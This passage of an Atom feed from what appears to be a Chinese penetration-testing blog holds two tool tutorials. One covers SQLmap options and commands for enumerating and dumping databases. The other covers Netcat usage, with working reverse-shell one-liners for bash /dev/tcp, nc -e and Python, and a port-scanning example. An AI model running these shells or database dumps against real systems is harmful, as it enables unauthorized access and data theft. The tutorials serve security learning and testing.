+    <content type="html"><![CDATA[<h2 id="SQLmap："><a href="#SQLmap：" class="headerlink" title="SQLmap："></a><strong>SQLmap：</strong></h2><p><strong>SQLmap参数：</strong></p><p>-u  URL=URL目标URL</p><p>-r 通过文本来进行探测（抓取数据复制到文本）</p><p>-g Google dork将Google dork结果处理为目标URL</p><p>–data=DATA 通过POST发送的数据字符串（例如“id=1”）</p><p>–cookie=cookie HTTP cookie头值（例如“PHPSESSID=a8d127e..”）</p><p> –random-agent  随机代理使用随机选择的HTTP用户代理头值</p><p> –proxy=PROXY  代理使用代理连接到目标URL</p><p> –level=LEVEL  要执行的测试级别（1-5，默认为1）</p><p>(指定Level进行探测爆破(不加等级时，默认1,最高是5):</p><p>level 1 (不添加时默认)</p><p>level 2 (测试HTTP和cookie)</p><p>level 3 (测试HTTP user-agent/referer)</p><p>不确定payload或那个参数是注入点</p><p>用越高的level探测，时间相对也会长）</p><p> –risk=RISK 风险=执行测试的风险（1-3，默认值1）</p><p> -b, –banner         标题检索DBMS标题</p><p>–second-url          重定第二个网页</p><p> –current-user      当前用户检索DBMS当前用户</p><p> –current-db         当前数据库检索DBMS当前数据库</p><p> –passwords        密码枚举DBMS用户密码哈希</p><p> –tables                表枚举DBMS数据库表</p><p> –columns            列枚举DBMS数据库表列</p><p> –schema             模式枚举DBMS模式</p><p> –dump                 转储DBMS数据库表项</p><p> –dump-all            转储所有转储所有DBMS数据库表条目</p><p> -D DB                  要枚举的D DB DBMS数据库</p><p> -T TBL                 要枚举的TBL DBMS数据库表</p><p> -C COL                要枚举的C列DBMS数据库表列</p><p> –os-shell             用于交互式操作系统外壳的os外壳提示符</p><p> –os-pwn              提示输入OOB外壳、流量计或VNC</p><p> –batch                 批处理从不要求用户输入，请使用默认行为</p><p><strong>SQLmap基本使用：</strong></p><p>指定网页进行注入点探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/sqlmap1.png"></p><p>列出当前所有的库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> --dbs  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/sqlmap2.png"></p><p>列出当前选中库的表</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> --tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/sqlmap3.png"></p><p>列出当前选中表和库的字段</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T <span class="token string">'表'</span> --columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/sqlmap4.png"></p><p>列出当前选中表，库，字段的记录</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：sqlmap -u <span class="token string">'URL'</span> -D <span class="token string">'库'</span> -T ‘表’ -C ‘字段’ --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/sqlmap5.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;SQLmap：&quot;&gt;&lt;a href=&quot;#SQLmap：&quot; class=&quot;headerlink&quot; title=&quot;SQLmap：&quot;&gt;&lt;/a&gt;&lt;strong&gt;SQLmap：&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SQLmap参数：&lt;/strong&gt;&lt;/p&gt;
+&lt;p</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Netcat工具</title>
+    <link href="http://example.com/2021/11/10/netcat%E5%B7%A5%E5%85%B7/"/>
+    <id>http://example.com/2021/11/10/netcat%E5%B7%A5%E5%85%B7/</id>
+    <published>2021-11-10T00:34:32.000Z</published>
+    <updated>2021-11-16T06:28:28.605Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h2><p><strong>Netcat参数：</strong></p><ol><li>-c shell命令为“-e”；使用/bin/sh执行</li><li>-e 文件名连接后要执行的程序</li><li>-b 允许广播</li><li>-g 网关源路由跃点，最多8个</li><li>-G num源路由指针：4，8，12</li><li>-l 侦听模式，用于入站连接</li><li>-n 仅数字IP地址，无DNS</li><li>-o 文件十六进制流量转储</li><li>-p 端口本地端口号</li><li>-r 随机化本地和远程端口</li><li>-q 秒在标准DIN上的EOF和秒延迟后退出</li><li>-s 地址本地源地址</li><li>-T tos集合服务类型</li><li>-u UDP模式</li><li>-v verbose[使用两次更详细]</li><li>-C 发送CRLF作为行结束</li><li>-z 零I/O模式[用于扫描]</li></ol><p><strong>Netcat常见使用方法：</strong></p><ol><li><p>监听本地端口，以详细列出</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/nc1.png"></p></li><li><p>扫描目标指定端口范围开放状态</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/nc2.png"></p></li><li><p>UDP扫描端口并返回端口信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -v -z -u <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/nc3.png"></p></li><li><p>在目标机没有nc的情况下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：bash -i <span class="token operator">>&amp;</span> /dev/tcp/Ip/Port <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本地机：</p><p><img src="/images/nc4.png"></p><p>目标机：</p><p><img src="/images/nc5.png"></p></li><li><p>windows下反弹cmd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>linux下反弹cmd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span> -e /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>文件传输</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -lvvp <span class="token number">8888</span> <span class="token operator">&lt;</span> <span class="token number">1</span>.txt 服务端 <span class="token function">nc</span> -vn <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token number">8888</span> <span class="token operator">></span> <span class="token number">1</span>.txt 客户端<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>nc反弹nc</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc -e /bin/bash <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span>Port<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>http请求（也可以进行ftp匿名探测）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：nc <span class="token punctuation">[</span>Ip<span class="token punctuation">]</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>python构造连接</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">格式：python -c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.11.144",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;Netcat&quot;&gt;&lt;a href=&quot;#Netcat&quot; class=&quot;headerlink&quot; title=&quot;Netcat&quot;&gt;&lt;/a&gt;Netcat&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Netcat参数：&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;-c shell命令为“-e</summary>
+      
+    
+    
+    
+    <category term="渗透" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+    <category term="渗透工具" scheme="http://example.com/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/"/>
+    
+  </entry>
+  
+</feed>
